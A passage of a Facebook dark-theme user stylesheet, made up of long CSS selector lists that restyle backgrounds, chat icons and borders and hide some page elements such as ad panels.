Grid tr > td > div,.statsContainer,#admin_panel,.fbTimelineSection, .escapeHatch,
.ogAggregationPanelContent, .-cx-PRIVATE-fbTimelineExternalShareUnit__root, .shareUnit a, .storyBox
{background: rgba(20,20,20,.4) !important;}\n\n.feed_comments,.home_status_editor,#rooster_container
,.rooster_story,.UIFullPage_Container,.UIRoundedBox_Box,.UIRoundedBox_Side,.wallpost,.profile_name_a
nd_status,.tabs_wrapper,.story,#feedwall_controls,.composer_well,.status_composer,.home_main_item,.f
eed_item,.HomeTabs_tab,#feed_content_section_applications li,.menu_separator,ahref=\"/friends\",.fee
d_options_link,.show_all_link,.status,#newsfeed_submenu,.morecontent_toggle_link,.more_link,.compose
r_tabs,.bl,.profile_tab,.story_posted_item,.left_column,.pager_next,.admarket_ad,.box,.inside,.shade
_b,.who_can_tab,.summary_simple,.footer_submit_rounded,.well_content,.info_section,.item_content,.ba
sic_info_summary_and_viewer_actions dt,.info
dt,.photo_table,.extra_content,.main_content,.search_inputs,.search_results,.result,.bar,.smalllinks
span,.quiz_actionbox,.column,.note_header,.fdh,#fpgc,#fpgc
td,.fmp,.fadvfilt,.fsummary,.frn,.two_column_wrapper,#new_ff,.see_more,.message_rows,.message_rows
tr,.toggle_tabs li,.toggle_tabs li a,.notifications,.updates_all,.composer,.WelcomePage_MainSellCont
ainer,.WelcomePage_MainSell,.media_gray_bg,.photo_comments_container,.photo_comments_main,.empty_mes
sage,.UIMediaHeader_Title,.UIMediaHeader_SubHeader,.footer_bar,.single_photo_header,#editphotoalbum,
.covercheck,#newalbum,.panel,.album,.dh_titlebar,.page_content,.dashboard_header,.photos_header,.pri
vacy_summary_items,.privacy_summary_item,.block_overview,.privacy_page_field,.editor_panel,.block,.a
ction_box,.even_column,.mobile_account_inlay,.language,.confirm_boxes,.confirm,.status_confirm,.hasn
t_app,.container, .UIDashboardHeader_TitleBar,.UIDashboardHeader_Container,.note,.UITwoColumnLayout_
Container,.dialog_body,.dialog_buttons,.group_lists,.group_lists th,.group_list,.updates,.share_sect
ion,#profilenarrowcolumn,#profilewidecolumn,#inline_wall_post,.post_link_bar,.helppro_content,.answe
rs_list_header,#help_titlebar,.new_user_guide,.new_user_guide_content,.flag_nav_item,.flag_nav_item
a,.arrowlink a,#safety_page,#safety_page
h5,.dashbar,.disclaimer,#store_options,#store_window,.step,.canvas_rel_positioning, .app_type
a,.sub_selected a,.box_head,.inside_the_box,.app_about,.fallback,.box_subhead,.fbpage_card,#devsite_
menubar,.content_sidebar,.side, .pBody li a,#p-logo,#p-navigation,#p-navigation .pBody,#bodyContent
h1,#p-wiki,#p-wiki .pBody,#p-search,#p-search .pBody,#p-tb,#p-tb .pBody,#bodyContent
table,#bodyContent table div,.recent_news,.main_news,.news_header, .devsite_subtabs li a,.middle-
container,.feed_msg h4,.ads_info,.contact_sales,.wrapper h3,.presence_bar_button:hover,.icon_garden_
elem:hover,#profile_minifeed,.focused,.dialog_summary,.tab span,.wallkit_postcontent h4,.address,#ba
dges,.badge_holder,.aim_link,.user_status,.section_editor,.my_numbers,.photo_editor,.gift_rows,.sub_
menu,.main-nav-tabs li a,.submenu_header,.new_gift,#profile_footer_actions,#status_bar,#summaryandpa
ger,.userlist,#feedBody,#feedHeaderContainer,#feedContent,.feedBackground,.mixer_panel,.titles,.slid
ers,.slider_holder,.fbpage_title,.options,#linkeditorform,.sideNavItem
.item,.typeahead_list_with_shadow,.module,.tc,.bc,.footer, .answer,.announcement,.basic_info_content
,.slot,.boardkit_no_topics,.ranked_friend,.boardkit_subtitle,.filter-
tabs,.level,.level_summary,.cause, .attachment_stage,.attachment_stage_area,.beneficiary_info,#info_
tab,#feedwall_with_composer,.frni,.frni a,.flistedit,.fmp_delete,#feed_content_section_friend_lists
li,.composer_tabs li:not(.selected),.menu_content li a,.view_on,.rounded-
box,.ffriend,.tab_content,.wrapper_background,.full_container,.white_box,#friends li
a,#inline_composer,.skin_body,.invite_tab_selected,.inside
table,.matches_matches_box,.matches_content_box_subtitle,trfbcontext=\"41097bfeb58d\",.dialog_body
div div,.new_menu_off,.present_info_label,.import_status,.upload_guidelines,.tagger_border,.chat_inf
o,.chat_conv_content,.chat_conv,.visibility_change,.pic_padding,.chat_notice,.chat_input_div,.wrappe
r,.toolbar_button,.toolbar_button_label,.pages_dashboard_panel,.no_pages,.divider,#filterview,#group
slist,.grouprow,.grouprow
table,.board_topic,#big_search,#invitation_list,#invitation_wrapper,.emails_error,
.outer_box,.inner_box,.days_remaining,.module,.submodule,.ntab,.ntab .tab_link,.grayheader,.inline_w
all_post,.related_box,.home_box_wrapper,.two_column,.challenge_stats,.quiz_box,
#fb_challenge,#fb_challenge_page,.challenge_leaderboard,.leaderboard_tile, .sidebar_upsell,.concerts
_module,.container_box,#login_homepage,.user_hatch_bg,.pick_main,#homepage,.wall_post_body,.track,.H
omeTabs_tab a,.minifeed,.alert_wrap,.logged_in_vertical_alert,.info_column,#public_listing_friends,#
public_listing_pages,.gamertag_app,.gamerProfileBody,#photo_picker,.album_picker .page0
.row,.dialog_loading,.timeline,.partyrow,.partyrow table,#invite_list li,.group_info_section,#moveab
le_wide,.UIProfileBox_Content,.story_content,.settings_panel,.app_browser li,.photos_tab,.recent_not
es,.side_note,.album_information,.results,.logged_out_register_vertical,.logged_out_register_wrapper
,.deleted,.home_prefs_saved,.share_send,.header_divide,.thread_header,.message,.status_composer_inne
r,.fbpage_edit_header,.app_switcher_unselected,.status_placeholder,.UIComposer_TDTextArea, .UIHomeBo
x_Content,.UIHotStory,.home_welcome,.summary_custom,.source_list,.minor_section,.UIComposer_Attachme
nt_TDTextArea,.info_diff span,.matches span,.menu_content,.UIcomposer_Dropdown_List,.UIComposer_Drop
down_Item,.feed_auto_update_settings,.container,.silver_footer,.friend_grid_col,.token >
span,.tokenizer_input,.tokenizer_input *,#friends_multiselect,.flink_inner
a:hover,#grouptypes,#startagroup p,.UICheckList,.FriendAddingTool_InnerMenu,.pagerpro li a:hover,#fr
iend_filters,.fb_menu_count_holder,.hp_box,.view_all_link,.app_settings_tab,.tab_link,#flm_add_title
,#flm_current_title,#flm_list_selector .selector,#friends_header,#friends_wrapper,.contacts_header,.
contacts_wrapper,.row1,.show_advanced_controls,.FriendAddingTool_InnerMenu,.UISelectList,.UISelectLi
st_Item,.UIIntentionalStory_CollapsedStories,.email_section,.section_header_bg,.rqbox,.ar_highlight,
#buddy_list_panel,.panel_item,.friendlist_status,.options_actions a span,.chat_setting label,.toolbo
x,.chat_actions,.UIWell,.UIComposer_InputArea,.invite_panel,.apinote,.UIInterstitialBox_Container,.i
cal_section,.maps_brand,.divbox4,.lighteryellow,.fan_status_inactive,.UIBeeperCap,.footer_fallback_b
ox,.footer_refine_search_company_school_box,.footer_refine_search_email_box,.UINestedFilterList_List
,.UINestedFilterList_SubItem,.UINestedFilterList_Item_Link,.UINestedFilterList_Item_Link,.UINestedFi
lterList_SubItem_Link,.app_dir_app_summary,.app_dir_featured_app_summary,.app_dir_app_wide_summary,.
profile_top_bar_container,.UIStream_Border,.question_container,.unselected_list label:nth-
child(odd),.request_box,.showcase,.steps li,#fb_sell_profile div,.promotion,.UIOneOff_Container
tabs,.whocan,.lock_r,.privacy_edit_link,.friend_list_container li:hover a,.email_field,.app_custom_c
ontent,#page,.thumb,.step_frame,.radioset,.radio_option,.page_option,.explanation_note,.card,.empty_
albums,.right_column,.full_widget,.connect_top,.creative_preview,.creative_column,.UIAdmgrCreativePr
eview,.UIEMUASFrame,.banner_wrapper,.dashboard,.pages,#photocrop_instructions,.UIContentBox_GrayDark
Top,.UIContentBox_Gray,.UIContentBox,#FriendsPage_ListingViewContainer,.post_editor,.entry,.fb_dashb
oard,.spacey_footer,.thread,.post,.UIWashFrame_Content,tablebindpoint=\"thread_row\",tablebindpoint=
\"thread_row\" tbody,.GBThreadMessageRow,.message_pane,.UIComposer_ButtonArea, .UIRoundedTransparent
Box_Border,.feedbackView,.group,.streamPaginator,.nullStatePane,.inboxControls,.filterControls,.inbo
xView tr,.tabView,.tabView li a,.splitViewContent,.photoGrid,.albumGrid,.frame
.img,.gridViewCrop,.gridView,.profileWall form,.story form,.formView,.inboxCompose,.LTokenizerToken,
#icon_garden,#buddy_list_tab,#presence_notifications_tab,#editphotoalbum
.photo,.UISuggestionList_SubContainer,.fan_action,.video_pane,.notify_option,
.video_gallery,.video,.uiTooltip:not(.close):hover,.people_table,.people_table table,#main,#navlist
li a.inactive,#rbar,.plays_bar,#fans,.updates_messages,.sent_updates_container,.subitem,#pagelet_nav
igation,.fbxWelcomeBox,.friends_online_sidebar,.uiTextHighlight,.tab_box,.bordered_list_item,.Settin
gsPage_PrivacySections,.profile-pagelet-
section,.profileInfoSection,#pts_invite_section,.main_body,.masterControl,.masterControl
.main,.linkbox,.uiTypeaheadView .search li,.language_form,#ads_privacy_examples,.fbPrivacyPage,.UISt
andardFrame_SidebarAds,#sidebar_ads,#globalWrapper #content,.portlet,.pBody,.noarticletext,#catlinks
m,.devsiteHeader,.devsiteFooter,.devsiteContent,.blockpost,.blockpost #topic,.blockpost
.postleft,.blockpost
.postfootleft,.fbRecommendation,.fbRecommendationWidgetContent,.add_comment,.connect_comment_widget 
.comment_content,.error,.even,.fbFeedbackPager,.uiComposerMessageBox,.facepileHolder,.notePermalinkM
aincol,.profilePreviewHeader,.pageAttachment,.editExperienceForm,.tourSteplist,.tourSteplist
ol,.uiStep,.uiStep:not(.uiStepSelected) .part, .uiStepSelected
.part:not(.middle),.better_fb_cp,legend,.bfb_option_body div,.messaging_nux_header,.fbInsightsTable
.odd td,.user.selected,.highlighter div
b,.fbQuestionsBlingBox:hover,.friend_list_container,.jewelItemList li a:active,#bfb_tip_pagelet > di
v,.UIUpcoming_Item,.video_with_comments,.video_info,.fbFeedTickerStory,.fbFeedTicker.fixed_elem,.fbx
Photo .fbPhotoImageStage .stageContainer,#DeveloperAppBody > .content,.opengraph
.preview,.coverNoImage,.fbTimelineScrubber,.fbTimelineAds,.fbProfilePlacesFilter,.fbFeedbackPost .UI
ImageBlock_Content,.permissionsViewEducation,.UIFaq_Container,#wizard,.captionArea,#bfb_options_cont
ent .option,.bfb_tab_selector,.UIMessageBoxExplanation,.uiStreamSubstories {background:
rgba(20,20,20,.2) !important;}\n\n.uiSelector .uiSelectorButton,.UIRoundedBox_Corner,.quote,.em,.UIR
oundedBox_TL,.UIRoundedBox_TR,.UIRoundedBox_BR,.UIRoundedBox_LS,.UIRoundedBox_BL,.profile_color_bar,
.pagefooter_topborder,.menu_content,h3,#feed_content_section_friend_lists,ul,liclass=\"\",.comment_b
ox,.comment,#homepage_bookmarks_show_more,.profile_top_wash,.canvas_container,.composer_rounded,.com
poser_well,.composer_tab_arrow,.composer_tab_rounded,.tl,.tr,.module_right_line_block,.body,.module_
bottom_line,.lock_b_bottom_line,#info_section_info_2530096808 .info
dt,.pipe,.dh_new_media,.dh_new_media .br,.frn_inpad,#frn_lists,#frni_0,.frecent span,h3
span,.UIMediaHeader_TitleWash,.editor_panel .right,.UIMediaButton_Container tbody
*,#userprofile,.profile_box,.date_divider span,.corner,.profile #content
.UIOneOff_Container,.ff3,.photo #nonfooter #page_height,.home #nonfooter #page_height,.home
.UIFullPage_Container,.main-
nav,.generic_dialog,#fb_multi_friend_selector_wrapper,#fb_multi_friend_selector,.tab
span,.tabs,.pixelated,.disabled,.title_header .basic_header,#profile_tabs li,#tab_content,.inside
td,.match_link span,trfbcontext=\"41097bfeb58d\" table,.accent,#tags h2,.read_updates,.user_input,.h
ome_corner,.home_side,.br,.share_and_hide,.recruit_action,.share_buttons,.input_wrapper,.status_fiel
d,.UIFilterList_ItemRight,.link_btn_style span,.UICheckList_Label,#flm_list_selector
.Tabset_selected .arrow,#flm_list_selector .selector .arrow .sel_link,.friendlist_status .title a,.o
nline_status_container,.list_drop_zone_inner,.good_username,.WelcomePage_Container,.UIComposer_Share
Button *,.UISelectList_Label,.UIComposer_InputShadow .UIComposer_TextArea,.UIMediaHeader_TitleWrappe
r,.boxtopcool_hg,.boxtopcool_trg,.boxtopcool_hd,.boxtopcool_trd,.boxtopcool_bd,.boxtopcool_bg,.boxto
pcool_b,#confirm_button,.title_text,#advanced_friends_1,.fb_menu_item_link,.fb_menu_item_link
small,.white_hover,.GBTabset_Pill span,.UINestedFilterList_ItemRight,.GBSearchBox_Input
input,.inline_edit,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th
div,.LTokenizer,.Mentions_Input,form.comment div,.ufi_section,.BubbleCount,.BubbleCount_Right,.UISto
ry,.object_browser_pager_more,.friendlist_name,.friendlist_name a,.switch,#tagger,.tagger_border,.ui
Tooltip,#reorder_fl_alert,.UIBeeper_Full,#navSearch,#navAccount,#navAccountPic,#navAccountName,#navA
ccountInfo,#navAccountLink,#mailBoxItems,#pagelet_chat_home h4,.buddy_row,.home_no_stories,#xpageNav
li .navSubmenu,.uiListItem:not(.ufiItem),.uiBubbleCount,.number,.fbChatBuddylistPanel,.wash,.setting
s_screenshot,.privacyPlan .uiListItem:hover,.no_border,.auxiliary
.highlight,.emu_comments_box_nub,.numberContainer,.uiBlingBox,.uiBlingBox:hover span,.callout_button
s,.uiWashLayoutEmptyGradientWash,.inputContainer,.editNoteWrapperInput,.fbTextEditorToolbar,.logoutB
utton input,#contentArea .uiHeader +
.uiBoxGray,.uiTokenizer,#bfb_tabs,.profilePictureNuxHighlight,.profile-
picture,#ci_module_list,.textBoxContainer,#date_form .uiButton,.insightsDateRange,.MessagingReadHead
er,.groupProfileHeaderWash,.questionSectionLabel,.metaInfoContainer,.uiStepList
ol,.friend_list,.fbFeedbackMentions,.bb .fbNubFlyoutHeader,.bb .fbNubFlyoutFooter,.fbNubFlyoutInner
.fbNubFlyoutFooter,.gradientTop,.gradientBottom,.helpPage,.fbEigenpollTypeahead
.plus,.uiSearchInput,.opengraph,#developerAppDetailsContent,.timelineLayout #contentCol,.attachmentL
ifeEvents,.fbProfilePlacesFilterBar,.uiStreamHeader,.uiStreamHeaderChronologicalForm,.inner .text,.p
ageNotifPopup,.uiButtonGroup,.navSubmenuPageLink,.fbTimelineTimePeriod,.bornUnit,.mleFooter,#bfb_fil
ter_add_row,#bfb_options .option .no_hover,.fbTimelinePhotosSeparator h4
span,.withsubsections,.showMore,.event_profile_information tr:hover,.nux_highlight_nub,.uiSideNav
.uiCloseButton,.uiSideNav .uiCloseButton input,.fb_content,.uiComposerAttachment .selected .attachme
ntName,.fbHubsTokenizer,.coverEmptyWrap,.uiStreamHeaderText,.pagesTimelineButtonPagelet,.fbNubFlyout
Body,#pageNav .tinyman:hover,#navHome:hover,.fbRemindersThickline,.uiStreamEdgeStoryLine
hr,.uiInfoTable tbody
tr:hover,.fbTimelineUFI,#contentArea,.leftPageHead,.rightPageHead,.anchorUnit,#pageNav .topNavLink a
:focus,.timeline_page_inbox_bar,.uiStreamEdgeStoryLineTx,.pluginRecommendationsBarButton,.pluginReco
mmendationsBarTop table, .uiToken, .ogAggregationPanelText, .UFIRow {background: transparent !import
ant;}\n\n.UIObject_SelectedItem,.sidebar_item_header,.announcement_title,#pagefooter,.selected:not(.
key-messages):not(.key-events):not(.key-media):not(.key-
ff):not(.page):not(.group):not(.user):not(.app),.date_divider_label,.profile_action,.blurb
,.tabs_more_menu,.more a span,.selected h2,.column h2,.ffriends,.make_new_list_button_table
tr,.title_header,.inbox_menu,.side_column,.section_header h3 span,.media_header,#album_container,.no
te_dialog,.dialog,.has_app,.UIMediaButton_Container,.dialog_title,.dialog_content,#mobile_notes_anno
uncement,.see_all,#profileActions,.fbpage_group_title,.UIProfileBox_SubHeader,#profileFooter,.share_
header,#share_button_dialog,.flag_nav_item_selected,.new_user_guide_content h2,#safety_page
h4,.section_banner,.box_head,#header_bar,.content_sidebar h3,.content_header,#events h3,#blog
h3,.footer_border_bottom,.firstHeading,#footer,.recent_news h3,.wrapper div h2,.UIProfileBox_Header,
.box_header,.bdaycal_month_section,#feedTitle,.pop_content,#linkeditor,.UIMarketingBox_Box,.utility_
menu a,.typeahead_list,.typeahead_suggestions,.typeahead_suggestion,.fb_dashboard_menu,.green_promot
ion,.module h2,.current_path,.boardkit_title,.current,.see_all2,.plain,.share_post,.add-
link,li.selected,.active_list a,#photoactions a:not
:not(#rotateleftlink),.UIPhotoTagList_Header,.dropdown_menu,.menu_content,.menu_content li
a:hover,.menu_content li:hover,#edit_profilepicture,.menu_content div a:hover,.contact_email_pending
,.req_preview_guts,.inputbutton,.inputsubmit,.activation_actions_box,.wall_content,.matches_content_
box_title,.new_menu_selected,#editnotes_content,#file_browser,.chat_window_wrapper,.chat_window,.cha
t_header,.hover,.dc_tabs a,.post_header,.header_cell,#error,.filters,.pages_dashboard_panel
h2,.srch_landing h2,.bottom_tray,.next_action,.pl-divider-container,.sponsored_story,.header_current
,.discover_concerts_box,.header,.sidebar_upsell_header,.activity_title
h2,.wall_post_title,#maps_options_menu,.menu_link,.gamerProfileTitleBar,.feed_rooster
,.emails_success,.friendTable table:hover,.board_topic:hover,.fan_table table:hover,#partylist
.partyrow:hover,.latest_video:hover,.wallpost:hover,.profileTable
tr:hover,.friend_grid_col:hover,.bookmarks_list li:hover,.requests_list li:hover,.birthday_list
li:hover,.tabs li,.fb_song:hover,.share_list .item_container:hover,.written a:hover,#photos_box
.album:hover,.people .row .person:hover,.group_list .group:hover,.confirm_boxes
.confirm:hover,.posted .share_item_wide .share_media:hover,.note:hover,.editapps_list
.app_row:hover,.my_networks .blocks .block:hover,.mock_h4,#notification_options
tr:hover,.notifications_settings li:hover,.mobile_account_main h2,.language h4,.products_listing
.product:hover,.info .item .item_content:hover,.info_section:hover,.recent_notes p:hover,.side_note:
hover,.suggestion,.story:hover,.post_data:hover,.album_row:hover,.track:hover,#pageheader,.message:h
over,inputtype=\"submit\":not(.fg_action_hide):not(.stat_elem):not(name=\"add\"):not(name=\"actionsr
eject\"):not(name=\"actionsaccept\"):not(value=\"Find Friends\"):not(value=\"Share\"):not(value=\"Ma
ybe\"):not(value=\"No\"):not(value=\"Yes\"):not(value=\"Comment\"):not(value=\"Reply\"):not(value=\"
Flag\"):not(type=\"submit\"),.UITabGrid_Link:hover,.UIActionButton,.UIActionButton_Link,.confirm_but
ton,.silver_dashboard,span.button,.col:hover,#photo_tag_selector,#pts_userlist,.flink_dropdown,.flin
k_inner,.grouprow:hover,#findagroup h4,#startagroup h4,.actionspro a:hover,.UIActionMenu_Menu,.UIChe
ckList_Label:hover,.make_new_list_button_table,.contextual_dialog_content,#flm_list_selector .select
or:hover,.show_advanced_controls:hover,.UISelectList_check_Checked,.section_header,.section_header_b
g,#buddy_list_panel_settings_flyout,.options_actions,.chat_setting,.flyout,.flyout
.UISelectList,.flyout .new_list,#tagging_instructions,.FriendsPage_MenuContainer,.UIActionMenu,.UIOb
jectListing:hover,.UIStory_Hide
.UIActionMenu_Wrap,.UIBeeper,.branch_notice,.async_saving,.UIActionMenu
.UIActionMenu_Wrap:hover,.attachment_link a:hover,.UITitledBox_Top,.UIBeep,.Beeps,#friends li
a:hover,.apinote h2,.UIActionButton_Text,.rsvp_option:hover,.onglettrhi,.ongletghi,.ongletdhi,.ongle
tg,.onglettr,.ongletd,.confirm_block, .unfollow_message,.UINestedFilterList_SubItem_Selected .UINest
edFilterList_SubItem_Link,.UINestedFilterList_SubItem_Link:hover,.UINestedFilterList_Item_Link:hover
,.UINestedFilterList_Selected .UINestedFilterList_Item_Link,.app_dir_app_summary:hover,.app_dir_feat
ured_app_summary:hover,.app_dir_app_wide_summary:hover,.UIStory:hover,.UIPortrait_TALL:hover,.UIActi
onMenu_Menu div,.UIButton_Blue,.UIButton_Gray,.quiz_cell:hover,.UIFilterList >
.UIFilterList_Title,.message_rows tr:hover,.ntab:hover,.thumb_selected,.thumb:hover,.hovered
a,.pandemic_bar,.promote_page,.promote_page a,.create_button
a,.nux_highlight,.UIActionMenu_Wrap,.share_button_browser
div,.silver_create_button,.painted_button,.flyer_button,tablebindpoint=\"thread_row\" tbody tr:hover
,.GBThreadMessageRow:hover,#header,.button:not(.close):not(.uiSelectorButton):not(.videoicon):not(.t
oggle),h4,button:not(.as_link),#navigation a:hover,.settingsPaneIcon:hover,a.current,.inboxView
tr:hover,.tabView li a:hover,.friendListView li:hover,.LTypeaheadResults,.LTypeaheadResults
a:hover,.dialog-title, .UISuggestionList_SubContainer:hover,.typeahead_message,.progress_bar_inner,.
video:hover,.advanced_controls_link,.plays_val,.lightblue_box,.FriendAddingTool_InnerMenu
.UISelectList,.gray_box,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget
.uiSelectorButton:not(.lockButton),.uiButtonSuppressed,#navAccount
li:not(#navAccountInfo),.jewelHeader,.seeMore,#mailBoxItems li,#pageFooter,.uiSideNav .key-
nf:hover,.key-messages .item:hover,.key-messages ul li:hover,.key-events ul li:hover,.key-media ul
li:hover,.key-ff ul li:hover,.key-apps:hover,.key-games:hover,.uiSideNav .sideNavItem:not(.open)
.item:hover,.fbChatOrderedList .item:hover
a,.uiHeader,.uiListItem:not(.mall_divider):hover,.uiSideNav li.selected > a,.ego_unit:hover,.results
,.bordered_list_item:hover,.fbConnectWidgetFooter,#viewas_header,.fbNubFlyoutTitlebar,.info_text,.st
age,.masterControl .selected a,.masterControl .controls .item a:hover,.uiTypeaheadView .search,.giga
boxx_thread_hidden_messages,.uiMenu,.uiMenuInner,.itemAnchor,.gigaboxx_thread_branch_message,.uiSide
NavCount,.uiBoxYellow,.loggedout_menubar_container,.pbm
.uiComposer,.megaphone_box,.uiCenteredMorePager,.fbEditProfileViewExperience:hover,.uiStepSelected
.middle,.GM_options_header,.bfb_tab_selected,
#MessagingShelfContent,.connect_widget_like_button,.uiSideNav
.open,.fbActivity:hover,.fbQuestionsPollResultsBar,.insightsDateRangeCustom,.fbInsightsTable thead
th,.mall_divider,.attachmentContent .fbTabGridItem:hover,.jewelItemNew,#MessagingThreadlist .unread,
.type_selected,.bfb_sticky_note,.UIUpcoming_Item:hover,.progress_bar_outer,.fbChatBuddyListDropdown
.uiButton,.UIConnectControlsListSelector .uiButton,.instructions,.uiComposerMetaContainer,.uiMetaCom
poserMessageBoxShelf,#feed_nux,#tickerNuxStoryDiv,.fbFeedTickerStory:hover,.fbCurrentStory:hover,.ui
Stream .uiStreamHeaderTall,.fbChatSidebarMessage,.fbPhotoSnowboxInfo,.devsitePage .menu,.devsitePage
.menu .content,#devsiteHomeBody .wikiPanel > div,.toolbarContentContainer,.fbTimelineUnitActor,#fbTi
melineHeadline,.fbTimelineNavigation,.fbTimelineFeedbackActions,.timelineReportHeader,.fbTimelineCap
sule .timelineUnitContainer:hover,.timelineReportContainer:hover,.fbTimelineComposerAttachments
.uiListItem:hover span a,.timelinePublishedToolbar,.timelineRecentActivityLabel,.fbTimelineMoreButto
n,.overlayTitle,.friendsBoxHeader,.escapeHatchHeader,.tickerStoryAllowClick,.appInvite:hover,.fbRemi
ndersStory:hover,.lifeEventAddPhoto a:hover,.insights-header,.ufb-dataTable-header-container,.ufb-
button,.older-posts-content,.mleButton:hover,.btnLink,.fill,.cropMessage,.adminPanelList li:hover a,
.tlPageRecentOverlayStream,.addListPageMegaphone,.searchListsBox,.ogStaticPagerHeader,.dialogTitle,#
rogerSidenavCallout,.fbTimelineAggregatedMapUnitSeeAll,.shareRedesignContainer,.ogSingleStoryText,.o
gSliderAnimPagerPrevWrapper,.ogSliderAnimPagerNextWrapper,.shareRedesignText,.pluginRecommendationsB
arTop,.timelineRecentActivityStory:hover, .ogAggregationPanelUFI\n{ background: url fixed repeat
!important;}\n\n.hovercard .stage,.profileChip,.GM_options_wrapper_inner,.MessagingReadHeader
.uiHeader,#MessagingShelf,#navAccount ul,.uiTypeaheadView,#blueBar,.uiFacepileItem
.uiTooltipWrap,.fbJewelFlyout,.jewelItemList
li,.notification:not(.jewelItemNew),.fbNubButton,.fbChatTourCallout
.body,.uiContextualDialogContent,.fbTimelineStickyHeader
.back,.timelineExpandLabel:hover,.pageNotifFooter
a,.fbSettingsListLink:hover,.uiOverlayPageContent,#bfb_option_list,.fbPhotoSnowlift .rhc,.ufb-tip-
title,.balloon-content,.tlPageRecentOverlayTitle,.uiDialog,.uiDialogForm,.permissionsLockText,
.uiMenuXBorder,.-cx-PRIVATE-uiDialog__content,.-cx-PRIVATE-uiDialog__title, ._k5\n{ background: url
fixed repeat, rgba(10,10,10,.6) !important; }\n\n.unread .badge,.fbDockChatBuddyListNub
.icon,.sx_7173a9,.selectedCheckable .checkmark {background: url no-repeat right
center!important;}\n\ntableclass=\" \" .badge:hover,tableclass=\"\" .badge:hover,.offline
.fbDockChatBuddyListNub .icon,.fbChatSidebar.offline .fbChatSidebarMessage .img {background: url no-
repeat right center!important;}\n\n.fbChatSidebar.offline .fbChatSidebarMessage .img {height: 16px
!important;}\n\n.offline .fbDockChatBuddyListNub .icon,.fbDockChatBuddyListNub .icon,.sx_7173a9
{margin-top: 0 !important;height: 15px !important;}\n\na.idle,.buddyRow.idle
.buddyBlock,.fbChatTab.idle .tab_availability,.fbChatTab.disabled .tab_availability,.chatIdle
.chatStatus,.idle .fbChatUserTab .wrap,.chatIdle .uiTooltipText,.markunread,.bb
.fbDockChatTab.user.idle .titlebarTextWrapper,.fbChatOrderedList .item:not(.active) .status
{background: url no-repeat left center !important;}\n\n.fbChatOrderedList .item .status {width: 10px
!important;}\n\n.headerTinymanName {max-width: 320px !important; white-space: nowrap !important;
overflow: hidden !important;}\n\n.uiTooltipText {padding-left: 14px !important;border: none
!important;}\n \n.fbNubButton,.bb .fbNubFlyoutTitlebar,.bb .fbNub
.noTitlebar,.fbDockChatTab,#fbDockChatBuddylistNub .fbNubFlyout,.fbDockChatTabFlyout,.titlebar
{border-radius: 8px 8px 0 0!important;}\n\n.uiSideNav .open {padding-right: 0
!important;}\n.uiSideNav .open,.uiSideNav .open > *,#home_stream > *,.bb .rNubContainer
.fbNub,.fbChatTab {margin-left: 0 !important;}\n.uiSideNav .open ul > * {margin-left: -20px
!important;}\n.uiSideNav .open .subitem > .rfloat {margin-right: 20px
!important;}\n\n.timelineUnitContainer .timelineAudienceSelector .uiSelectorButton {padding: 1px
!important; margin: 4px 0 0 4px !important;}\n.timelineUnitContainer .audienceSelector
.uiButtonNoText .customimg {margin: 2px !important;}\n.timelineUnitContainer
.composerAudienceSelector .customimg {opacity: 1 !important; background-position: 0 1px !important;
padding: 0 !important;}\n\n.fbNub.user:not(.disabled) .wrap {padding-left: 15px
!important;}\n.fbNubFlyoutTitlebar .titlebarText {padding-left: 12px
!important;}\n\na.friend:not(.idle),.buddyRow:not(.idle)
.buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline
.chatStatus,.markread,.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline
.uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled)
.titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.uiMenu
.checked .itemAnchor {background: url no-repeat
!important;}\n\na.friend:not(.idle),.buddyRow:not(.idle)
.buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline
.chatStatus,.markread,a.idle,.buddyRow.idle .buddyBlock {background-position: right center
!important;}\n\n.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb
.fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active
.status,.active .titlebarTextWrapper,.user .fbChatUserTab .wrap {background-position: left center
!important;}\n\n.uiMenu .checked .itemAnchor {background-position: 5px center
!important;}\n\n.markunread,.markread {background-position: 0 center !important;}\n\n.chatIdle
.chatStatus,.chatOnline .chatStatus {width: 10px !important;height: 10px !important;background-
position: 0 0 !important;}\n\n#fbRequestsJewel .jewelButton {background: url no-repeat center center
!important;}\n\n#fbRequestsJewel:hover .jewelButton,#fbRequestsJewel.hasNew .jewelButton
{background: url no-repeat center center !important;}\n\n#fbMessagesJewel .jewelButton {background:
url no-repeat center center !important;}\n\n#fbMessagesJewel:hover
.jewelButton,#fbMessagesJewel.hasNew .jewelButton {background: url no-repeat center center
!important;}\n\n#fbNotificationsJewel .jewelButton {background: url no-repeat center center
!important;}\n\n#fbNotificationsJewel:hover .jewelButton,#fbNotificationsJewel.hasNew .jewelButton
{background: url no-repeat center center !important;}\n\n.topBorder,.bottomBorder {background: #000
!important;}\n\n.pl-item,.ical,.pop_content {background-color: #333 !important;}\n.pl-alt
{background-color: #222 !important;}\n\n.friend:hover,.friend:not(.idle):hover,.fbTimelineRibbon
{background-color: rgba(10,10,10,.6) !important;}\n\n.maps_arrow,#sidebar_ads,.available .x_to_hide,
.left_line,.line_mask,.chat_input_border,.connect_widget_button_count_nub,\n.uiStreamPrivacyContaine
r .uiTooltip .img,.UIObjectListing_PicRounded,.UIRoundedImage_CornersSprite,.UITabGrid_Link:hover
.UITabGrid_LinkCorner_TL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TR,.UITabGrid_Link:hover
.UITabGrid_LinkCorner_BL,.UITabGrid_Link:hover
.UITabGrid_LinkCorner_BR,.UILinkButton_R,.pagesAboutDivider {visibility:hidden !important;}\n\n.nub,
#contentCurve,#pagelet_netego_ads,img.plus,.highlighter,.uiToolbarDivider,.bfb_sticky_note_arrow_bor
der,.bfb_sticky_note_arrow,#ConfirmBannerOuterContainer,.uiStreamHeaderBorder,.topBorder,.bottomBord
er,.middleLink:after,.sideNavItem .uiCloseButton,.mask,.topSectionBottomBorder {display: none
!important;}\n\n.fbChatBuddyListTypeahead {display: block !important;}\n\n.chat_input {width: 195px 
